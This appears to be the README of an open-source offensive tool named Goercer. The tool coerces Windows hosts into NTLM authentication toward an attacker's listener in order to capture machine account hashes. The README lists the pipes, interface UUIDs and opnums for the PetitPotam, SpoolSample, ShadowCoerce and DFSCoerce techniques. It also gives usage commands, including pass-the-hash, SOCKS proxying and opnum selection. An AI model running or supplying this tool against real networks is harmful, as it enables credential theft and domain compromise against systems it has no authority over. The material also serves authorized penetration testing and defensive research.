# Goercer

NTLM coercion tool using authenticated DCERPC with PKT_PRIVACY (encryption + signing).

## How It Works

1. Authenticates to target via SMB using NTLM (password or pass-the-hash)
2. Opens named pipe and binds to RPC interface with PKT_PRIVACY
3. Calls RPC functions with attacker-controlled UNC path parameter
4. Target attempts to access UNC path, authenticating to attacker's listener
5. Attacker captures machine account NTLMv2 hash

## Techniques

### PetitPotam (MS-EFSRPC)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\efsrpc` (native) or `\pipe\lsarpc`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (legacy) |
| UUID | `df1941c5-fe89-4e79-bf10-463657acf44d` (efsrpc) |
| UUID | `c681d488-d850-11d0-8c52-00c04fd90f7e` (legacy pipes) |
| Opnums | 0 (EfsRpcOpenFileRaw), 4 (EfsRpcEncryptFileSrv), 5 (EfsRpcDecryptFileSrv), 6 (EfsRpcQueryUsersOnFile), 7 (EfsRpcQueryRecoveryAgents), 12 (EfsRpcFileKeyInfo) |
| Parameter | UNC path in `FileName` |

### SpoolSample (MS-RPRN)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\spoolss` |
| UUID | `12345678-1234-abcd-ef00-0123456789ab` |
| Opnums | 1 (RpcOpenPrinter), 62 (RpcRemoteFindFirstPrinterChangeNotification), 65 (RpcRemoteFindFirstPrinterChangeNotificationEx) |
| Parameter | UNC path in `pszLocalMachine` |
| Requirement | Print Spooler service running |

### ShadowCoerce (MS-FSRVP)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\FssagentRpc` |
| UUID | `a8e0653c-2744-4389-a61d-7373df8b2292` |
| Opnums | 8 (IsPathSupported), 9 (IsPathShadowed) |
| Parameter | UNC path in `ShareName` |
| Requirement | VSS configured for RPC access |

### DFSCoerce (MS-DFSNM)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\netdfs` |
| UUID | `4fc742e0-4a10-11cf-8273-00aa004ae673` |
| Opnums | 12 (NetrDfsAddStdRoot), 13 (NetrDfsRemoveStdRoot) |
| Parameter | UNC path in `ServerName` |
| Requirement | DFS Namespaces role installed |

## Usage

```bash
# Default (PetitPotam with efsrpc pipe)
./goercer -t <target> -l <listener> -u <user> -d <domain>

# Pass-the-hash
./goercer -t <target> -l <listener> -u <user> -H <ntlm_hash> -d <domain>

# SpoolSample method
./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample

# Legacy pipe
./goercer -t <target> -l <listener> -u <user> -d <domain> --pipe lsarpc

# Specific opnum
./goercer -t <target> -l <listener> -u <user> -d <domain> --opnum 4

# Through SOCKS5 proxy
./goercer -t <target> -l <listener> -u <user> -d <domain> --proxy socks5://127.0.0.1:1080
```

## Flags

| Flag | Description |
|------|-------------|
| `-t, --target` | Target IP address |
| `-l, --listener` | Listener IP for callback |
| `-u, --user` | Domain username |
| `-d, --domain` | Domain name |
| `-p, --password` | Password (prompts if omitted) |
| `-H, --hash` | NTLM hash (32 hex chars) |
| `-m, --method` | Method: `petitpotam`, `spoolsample`, `shadowcoerce`, `dfscoerce` |
| `--pipe` | Named pipe: `efsrpc`, `lsarpc`, `samr`, `netlogon`, `lsass` |
| `--opnum` | Specific opnum to test |
| `--proxy` | SOCKS5 proxy URL |
| `-v, --verbose` | Debug output |

## Install

```bash
git clone https://github.com/ineffectivecoder/goercer.git
cd goercer
./build.sh
```
